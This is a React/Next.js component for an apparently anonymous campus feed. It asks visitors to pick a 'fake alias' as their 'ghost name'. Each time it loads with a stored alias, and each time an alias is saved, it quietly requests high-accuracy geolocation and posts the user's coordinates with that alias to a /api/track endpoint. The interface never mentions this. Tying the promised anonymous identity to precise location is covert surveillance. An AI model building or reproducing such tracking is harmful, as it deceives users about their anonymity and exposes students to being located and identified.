"use client";
import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Ghost } from 'lucide-react';
import { usePathname } from 'next/navigation';

export function AliasProvider({ children }) {
  const [alias, setAlias] = useState(null);
  const [inputName, setInputName] = useState('');
  const [isMounted, setIsMounted] = useState(false);
  const pathname = usePathname();

  useEffect(() => {
    setIsMounted(true);
    const storedAlias = localStorage.getItem('aliasName');
    if (storedAlias) {
      setAlias(storedAlias);
      trackVisitor(storedAlias);
    } else {
      setAlias(''); 
    }
  }, []);

  const trackVisitor = (aliasStr) => {
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          fetch('/api/track', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              alias: aliasStr,
              location: {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: position.coords.accuracy
              }
            })
          });
        },
        () => {
          fetch('/api/track', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ alias: aliasStr })
          });
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
      );
    } else {
      fetch('/api/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ alias: aliasStr })
      });
    }
  };

  const handleSave = (e) => {
    e.preventDefault();
    if (inputName.trim()) {
      localStorage.setItem('aliasName', inputName.trim());
      setAlias(inputName.trim());
      trackVisitor(inputName.trim());
    }
  };

  if (!isMounted) return null;

  // Don't show modal on admin routes
  if (pathname.startsWith('/admin')) {
    return <>{children}</>;
  }

  return (
    <>
      {children}
      
      <AnimatePresence>
        {alias === '' && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/80 backdrop-blur-xl"
          >
            <motion.div 
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              className="bg-[#050505] border border-white/10 p-8 rounded-3xl shadow-[0_0_50px_rgba(192,255,0,0.2)] max-w-md w-full relative overflow-hidden"
            >
              <div className="absolute -top-20 -right-20 w-40 h-40 bg-[#c0ff00] opacity-20 blur-[50px] rounded-full"></div>
              
              <div className="flex justify-center mb-6 relative z-10">
                <div className="w-20 h-20 rounded-full bg-white/5 border border-[#c0ff00]/50 flex items-center justify-center">
                  <Ghost className="w-10 h-10 text-[#c0ff00]" />
                </div>
              </div>
              
              <h2 className="text-3xl font-black text-white text-center uppercase tracking-widest mb-2 relative z-10">Identity Required</h2>
              <p className="text-gray-400 text-center text-sm font-sans mb-8 relative z-10">Choose a fake alias to use across the campus feed. This will be your ghost name.</p>
              
              <form onSubmit={handleSave} className="relative z-10 flex flex-col gap-4">
                <input 
                  required
                  placeholder="e.g. Agent 47"
                  value={inputName}
                  onChange={e => setInputName(e.target.value)}
                  className="w-full bg-white/5 border border-white/20 rounded-xl p-4 text-white text-center font-bold focus:outline-none focus:border-[#c0ff00] transition-colors"
                />
                <button type="submit" className="w-full bg-[#c0ff00] text-black font-black uppercase py-4 rounded-xl hover:bg-white transition-colors">
                  ENTER THE VOID
                </button>
              </form>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </>
  );
}
